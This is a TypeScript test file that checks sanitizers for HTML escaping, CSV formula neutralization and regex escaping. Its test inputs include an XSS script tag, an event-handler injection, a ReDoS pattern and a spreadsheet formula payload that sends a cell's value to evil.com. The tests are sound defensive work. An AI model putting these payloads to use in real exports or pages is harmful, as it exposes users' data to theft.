import { test } from 'node:test'
import assert from 'node:assert/strict'
import { escapeHtml, csvField, escapeRegExp } from './sanitize.ts'

// ── escapeHtml — HTML/script injection into email bodies ──────────────────────
test('escapeHtml neutralizes a script tag', () => {
  assert.equal(
    escapeHtml('<script>alert(1)</script>'),
    '&lt;script&gt;alert(1)&lt;/script&gt;',
  )
})
test('escapeHtml escapes attribute-breaking quotes and ampersands', () => {
  assert.equal(escapeHtml('" onmouseover="steal()'), '&quot; onmouseover=&quot;steal()')
  assert.equal(escapeHtml('Tom & Jerry'), 'Tom &amp; Jerry')
  assert.equal(escapeHtml("O'Brien"), 'O&#39;Brien')
})
test('escapeHtml handles null/undefined without throwing', () => {
  assert.equal(escapeHtml(null), '')
  assert.equal(escapeHtml(undefined), '')
})
test('escapeHtml leaves benign text untouched', () => {
  assert.equal(escapeHtml('Summit Ridge Roofing'), 'Summit Ridge Roofing')
})

// ── csvField — spreadsheet formula injection in call exports ──────────────────
test('csvField neutralizes leading formula triggers', () => {
  assert.equal(csvField('=1+1'), "'=1+1")
  assert.equal(csvField('+1'), "'+1")
  assert.equal(csvField('-2+3'), "'-2+3")
  assert.equal(csvField('@SUM(A1:A9)'), "'@SUM(A1:A9)")
})
test('csvField neutralizes the classic exfil payload', () => {
  // A caller name crafted to hyperlink-exfiltrate on open. It also contains a
  // comma + quotes, so the safe output is BOTH apostrophe-neutralized AND
  // CSV-quoted: "'=HYPERLINK(...)". What matters: the cell is no longer a live
  // formula (doesn't begin with a bare =) and the apostrophe guard is present.
  const out = csvField('=HYPERLINK("http://evil.com?x="&A1,"click")')
  assert.equal(out.startsWith('='), false)
  assert.ok(out.includes("'=HYPERLINK"))
})
test('csvField quotes and escapes CSV control characters', () => {
  assert.equal(csvField('Smith, John'), '"Smith, John"')
  assert.equal(csvField('a"b'), '"a""b"')
  assert.equal(csvField('line1\nline2'), '"line1\nline2"')
})
test('csvField quotes AND neutralizes when both apply', () => {
  assert.equal(csvField('=1,2'), '"\'=1,2"')
})
test('csvField leaves benign values untouched', () => {
  assert.equal(csvField('booked'), 'booked')
  assert.equal(csvField(42), '42')
  assert.equal(csvField(null), '')
})

// ── escapeRegExp — regex injection / ReDoS via search term ────────────────────
test('escapeRegExp escapes regex metacharacters', () => {
  assert.equal(escapeRegExp('.*+?'), '\\.\\*\\+\\?')
  assert.equal(escapeRegExp('a(b)c'), 'a\\(b\\)c')
})
test('escapeRegExp makes an attacker term match only literally', () => {
  const re = new RegExp(escapeRegExp('.*')) // would match everything if unescaped
  assert.equal(re.test('roof'), false)
  assert.equal(re.test('.*'), true)
})
test('escapeRegExp defuses a catastrophic-backtracking term to a literal', () => {
  const re = new RegExp(escapeRegExp('(a+)+$'))
  assert.equal(re.test('(a+)+$'), true)
  assert.equal(re.test('aaaaaaaaaaaaaaaaaaaa!'), false)
})
